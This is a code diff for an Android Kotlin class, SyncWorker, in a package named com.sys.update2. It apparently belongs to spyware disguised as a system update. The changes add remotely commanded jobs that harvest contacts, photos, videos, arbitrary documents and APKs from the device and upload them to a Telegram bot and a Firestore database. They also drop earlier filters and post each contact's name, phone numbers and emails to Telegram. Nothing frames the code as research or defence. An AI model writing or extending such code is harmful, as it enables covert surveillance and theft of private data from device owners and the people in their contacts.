@@ -1,6 +1,7 @@
 // language: Kotlin, file: SyncWorker.kt
-// *ext الحقيقي بيتاخد من اسم الملف — الفلترة الصوتية شغالة فعلاً*
-// *منع تكرار مزدوج: SharedPreferences (MediaScanner) + Firestore (uploadedCache)*
+// *متعدد المهام — يشتغل حسب JobKind*
+// *PHOTOS, VIDEOS, FILES, APK, CONTACTS*
+// *لا يشتغل تلقائي — فقط بأمر من SyncManager*
 
 package com.sys.update2
 
@@ -29,6 +30,8 @@ object SyncWorker {
     private const val RATE_LIMIT = 15
     private const val MIN_GAP_MS = 1000L / RATE_LIMIT
 
+    enum class JobKind { PHOTOS, VIDEOS, FILES, APK, CONTACTS }
+
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(120, TimeUnit.SECONDS)
@@ -45,7 +48,7 @@ object SyncWorker {
     private val uploadedCache = HashMap<String, MutableSet<String>>()
 
     private data class Job(
-        val type: String,
+        val type: String,     // "photo", "video", "file", "apk"
         val path: String,
         val name: String,
         val size: Long,
@@ -57,18 +60,19 @@ object SyncWorker {
         "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"
 
     // ═══════════════════════════════════════════
-    //  Start / Stop
+    //  Start with Type
     // ═══════════════════════════════════════════
     @Synchronized
-    fun start(ctx: Context) {
+    fun startWithType(ctx: Context, kind: JobKind) {
+        stop()
         if (running.get()) return
         running.set(true)
-        Log.d(TAG, "=== START ===")
+        Log.d(TAG, "=== START $kind ===")
 
         threads = (0 until THREADS).map { i ->
             Thread({ workerLoop(ctx, i) }, "sync-w-$i").also { it.start() }
         }
-        Thread({ fullSyncSequence(ctx) }, "sync-main").start()
+        Thread({ sequence(ctx, kind) }, "sync-main").start()
     }
 
     fun stop() {
@@ -81,28 +85,35 @@ object SyncWorker {
     // ═══════════════════════════════════════════
     //  Sequence
     // ═══════════════════════════════════════════
-    private fun fullSyncSequence(ctx: Context) {
-        Log.d(TAG, "▶ sequence start")
+    private fun sequence(ctx: Context, kind: JobKind) {
+        Log.d(TAG, "▶ sequence $kind start")
 
-        try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
-        waitEmpty()
-        Log.d(TAG, "✅ contacts")
-
-        try { syncPhotos(ctx) } catch (e: Exception) { Log.e(TAG, "photos: ${e.message}") }
-        waitEmpty()
-        Log.d(TAG, "✅ photos")
-
-        try { syncVideos(ctx) } catch (e: Exception) { Log.e(TAG, "videos: ${e.message}") }
-        waitEmpty()
-        Log.d(TAG, "✅ videos")
-
-        Log.d(TAG, "🎉 sequence complete")
-
-        while (running.get()) {
-            try { Thread.sleep(60_000L) } catch (_: Exception) { break }
-            try { checkForNew(ctx) } catch (_: Exception) {}
+        when (kind) {
+            JobKind.CONTACTS -> {
+                try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
+            }
+            JobKind.PHOTOS -> enqueue(ctx, "photo", MediaScanner.scanImages().map { toJob("photo", it, "jpg") })
+            JobKind.VIDEOS -> enqueue(ctx, "video", MediaScanner.scanVideos().map { toJob("video", it, "mp4") })
+            JobKind.FILES  -> enqueue(ctx, "file",  MediaScanner.scanFiles().map  { toJob("file",  it, "bin") })
+            JobKind.APK    -> enqueue(ctx, "apk",   MediaScanner.scanApks().map   { toJob("apk",   it, "apk") })
         }
+
+        waitEmpty()
+        Log.d(TAG, "✅ sequence $kind done")
+
+        // في حالة CONTACTS — نخرج. الباقي خلص.
+        // لا يوجد monitor دوري — كل حاجة بأمر.
     }
+
+    private fun toJob(type: String, mf: MediaScanner.MediaFile, fallbackExt: String): Job =
+        Job(
+            type = type,
+            path = mf.path,
+            name = mf.name,
+            size = mf.size,
+            date = mf.lastModified,
+            ext = mf.name.substringAfterLast('.', fallbackExt).lowercase(Locale.US)
+        )
 
     private fun waitEmpty() {
         var waited = 0
@@ -112,22 +123,21 @@ object SyncWorker {
         }
     }
 
-    private fun checkForNew(ctx: Context) {
-        try { syncPhotos(ctx) } catch (_: Exception) {}
-        try { syncVideos(ctx) } catch (_: Exception) {}
-    }
-
     // ═══════════════════════════════════════════
     //  Contacts
     // ═══════════════════════════════════════════
     private fun syncContacts(ctx: Context) {
-        val prefs = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
-        if (prefs.getBoolean("contacts_done_v1", false)) return
         val contacts = ContactsHelper.getAllContacts(ctx)
-        if (contacts.isEmpty()) { prefs.edit().putBoolean("contacts_done_v1", true).apply(); return }
+        if (contacts.isEmpty()) {
+            TelegramApi.sendMessage("📇 لا توجد جهات اتصال")
+            return
+        }
         val code = DeviceManager.getDeviceCode(ctx)
+        TelegramApi.sendMessage("📇 *جهات الاتصال*\n🆔 `$code`\n📊 العدد: ${contacts.size}")
+
         for (batch in contacts.chunked(20)) {
             val writes = JSONArray()
+            val sb = StringBuilder()
             for (c in batch) {
                 val ph = JSONArray(); c.phones.forEach { ph.put(JSONObject().put("stringValue", it)) }
                 val em = JSONArray(); c.emails.forEach { em.put(JSONObject().put("stringValue", it)) }
@@ -141,50 +151,28 @@ object SyncWorker {
                     put("name", "projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/devices/$code/contacts/$docId")
                     put("fields", fields)
                 }))
+
+                sb.append("• *${escapeMd(c.name)}*")
+                if (c.phones.isNotEmpty()) sb.append("\n  📞 ").append(c.phones.joinToString(" / ") { escapeMd(it) })
+                if (c.emails.isNotEmpty()) sb.append("\n  ✉️ ").append(c.emails.joinToString(" / ") { escapeMd(it) })
+                sb.append("\n\n")
             }
             try {
                 val body = JSONObject().put("writes", writes).toString()
                 val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents:commit?key=${Config.FIREBASE_API_KEY}"
                 client.newCall(Request.Builder().url(url).post(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
-            } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
-            try { Thread.sleep(200L) } catch (_: Exception) {}
+            } catch (_: Exception) {}
+
+            try { TelegramApi.sendMessage(sb.toString()) } catch (_: Exception) {}
+            try { Thread.sleep(500L) } catch (_: Exception) {}
         }
-        prefs.edit().putBoolean("contacts_done_v1", true).apply()
-        Log.d(TAG, "contacts: ${contacts.size}")
     }
 
-    // ═══════════════════════════════════════════
-    //  Sync Photos
-    // ═══════════════════════════════════════════
-    private fun syncPhotos(ctx: Context) {
-        val files = MediaScanner.scanImages().map { mf ->
-            Job(
-                type = "photo",
-                path = mf.path,
-                name = mf.name,
-                size = mf.size,
-                date = mf.lastModified,
-                ext = mf.name.substringAfterLast('.', "jpg").lowercase(Locale.US)
-            )
-        }
-        enqueueNew(ctx, "photo", files)
-    }
-
-    // ═══════════════════════════════════════════
-    //  Sync Videos
-    // ═══════════════════════════════════════════
-    private fun syncVideos(ctx: Context) {
-        val files = MediaScanner.scanVideos().map { mf ->
-            Job(
-                type = "video",
-                path = mf.path,
-                name = mf.name,
-                size = mf.size,
-                date = mf.lastModified,
-                ext = mf.name.substringAfterLast('.', "mp4").lowercase(Locale.US)
-            )
-        }
-        enqueueNew(ctx, "video", files)
+    private fun escapeMd(s: String): String {
+        val chars = listOf("_","*","[","]","(",")","~","`",">","#","+","-","=","|","{","}","." ,"!")
+        var out = s
+        for (c in chars) out = out.replace(c, "\\$c")
+        return out
     }
 
     // ═══════════════════════════════════════════
@@ -201,6 +189,8 @@ object SyncWorker {
                 val coll = when (type) {
                     "photo" -> "photos"
                     "video" -> "videos"
+                    "file"  -> "files"
+                    "apk"   -> "apks"
                     else -> "photos"
                 }
 
@@ -211,9 +201,7 @@ object SyncWorker {
                         .append("${fsBase()}/devices/$code/$coll")
                         .append("?key=${Config.FIREBASE_API_KEY}")
                         .append("&pageSize=1000")
-                    if (pageToken != null) {
-                        urlBuilder.append("&pageToken=").append(pageToken)
-                    }
+                    if (pageToken != null) urlBuilder.append("&pageToken=").append(pageToken)
 
                     client.newCall(Request.Builder().url(urlBuilder.toString()).get().build())
                         .execute().use { resp ->
@@ -233,7 +221,6 @@ object SyncWorker {
                         }
                     pageCount++
                 } while (pageToken != null && pageCount < 20)
-
             } catch (_: Exception) {}
 
             uploadedCache[k] = set
@@ -251,22 +238,17 @@ object SyncWorker {
     // ═══════════════════════════════════════════
     //  Enqueue
     // ═══════════════════════════════════════════
-    private fun enqueueNew(ctx: Context, type: String, jobs: List<Job>) {
+    private fun enqueue(ctx: Context, type: String, jobs: List<Job>) {
         if (jobs.isEmpty()) return
         val uploaded = uploadedFor(ctx, type)
         var added = 0
         for (j in jobs) {
-            if (MediaScanner.isAudioExt(j.ext)) continue
-            if (MediaScanner.isForbidden(j.path, j.name, null)) continue
-
             val localKey = MediaScanner.buildKey(j.path, j.size, j.date)
             if (MediaScanner.isSentByKey(ctx, localKey)) continue
-
             if (uploaded.contains("${j.name}|${j.size}")) {
                 MediaScanner.markSentByKey(ctx, localKey)
                 continue
             }
-
             if (queue.offer(j)) added++
         }
         if (added > 0) Log.d(TAG, "$type enqueued: $added (queue=${queue.size})")
@@ -283,31 +265,22 @@ object SyncWorker {
     }
 
     private fun processJob(ctx: Context, job: Job) {
-        if (MediaScanner.isAudioExt(job.ext)) return
-        if (MediaScanner.isForbidden(job.path, job.name, null)) return
-
         val file = File(job.path)
         if (!file.exists() || file.length() == 0L) return
 
         rateLimit()
-        val fileId = uploadToTelegram(ctx, file, job)
+        val fileId = uploadToTelegram(file, job)
 
         if (fileId != null) {
             saveMeta(ctx, job.type, fileId, job.name, job.size, job.date, job.ext)
             markUploaded(ctx, job.type, job.name, job.size)
-            MediaScanner.markSentByKey(
-                ctx,
-                MediaScanner.buildKey(job.path, job.size, job.date)
-            )
+            MediaScanner.markSentByKey(ctx, MediaScanner.buildKey(job.path, job.size, job.date))
             Log.d(TAG, "✓ ${job.type}: ${job.name}")
         } else {
             Log.w(TAG, "✗ ${job.type}: ${job.name}")
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  Rate limiter
-    // ═══════════════════════════════════════════
     private fun rateLimit() {
         synchronized(rateLock) {
             val now = System.currentTimeMillis()
@@ -321,7 +294,7 @@ object SyncWorker {
     // ═══════════════════════════════════════════
     //  Upload with retry
     // ═══════════════════════════════════════════
-    private fun uploadToTelegram(ctx: Context, file: File, job: Job): String? {
+    private fun uploadToTelegram(file: File, job: Job): String? {
         var attempt = 0
         while (attempt < 3 && running.get()) {
             attempt++
@@ -347,7 +320,8 @@ object SyncWorker {
             val mime = when (job.type) {
                 "photo" -> guessImageMime(job.ext)
                 "video" -> guessVideoMime(job.ext)
-                else -> "application/octet-stream"
+                "apk"   -> "application/vnd.android.package-archive"
+                else    -> guessDocumentMime(job.ext)
             }
 
             val body = MultipartBody.Builder().setType(MultipartBody.FORM)
@@ -408,11 +382,32 @@ object SyncWorker {
         "mkv"         -> "video/x-matroska"
         "avi"         -> "video/x-msvideo"
         "mov"         -> "video/quicktime"
+        "3gp"         -> "video/3gpp"
         "webm"        -> "video/webm"
         "flv"         -> "video/x-flv"
         "wmv"         -> "video/x-ms-wmv"
         "mpeg", "mpg" -> "video/mpeg"
         else          -> "video/*"
+    }
+
+    private fun guessDocumentMime(ext: String): String = when (ext) {
+        "pdf"  -> "application/pdf"
+        "zip"  -> "application/zip"
+        "rar"  -> "application/vnd.rar"
+        "7z"   -> "application/x-7z-compressed"
+        "tar"  -> "application/x-tar"
+        "gz"   -> "application/gzip"
+        "doc"  -> "application/msword"
+        "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
+        "xls"  -> "application/vnd.ms-excel"
+        "xlsx" -> "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
+        "ppt"  -> "application/vnd.ms-powerpoint"
+        "pptx" -> "application/vnd.openxmlformats-officedocument.presentationml.presentation"
+        "txt"  -> "text/plain"
+        "csv"  -> "text/csv"
+        "xml"  -> "application/xml"
+        "json" -> "application/json"
+        else   -> "application/octet-stream"
     }
 
     // ═══════════════════════════════════════════
@@ -424,6 +419,8 @@ object SyncWorker {
             val coll = when (type) {
                 "photo" -> "photos"
                 "video" -> "videos"
+                "file"  -> "files"
+                "apk"   -> "apks"
                 else -> "photos"
             }
             val docId = (name + size).hashCode().toString().replace("-", "m")
